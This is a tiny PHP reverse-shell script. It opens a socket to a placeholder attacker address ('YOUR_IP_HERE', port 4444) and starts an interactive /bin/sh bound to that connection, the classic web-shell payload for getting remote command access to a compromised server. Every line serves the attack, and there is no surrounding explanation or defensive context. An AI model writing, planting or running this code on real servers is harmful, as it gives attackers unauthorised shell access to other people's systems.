<?php
$ip = 'YOUR_IP_HERE';
$port = 4444;

$sock = fsockopen($ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3"); // Note: This assumes file descriptor 3 is available
?>
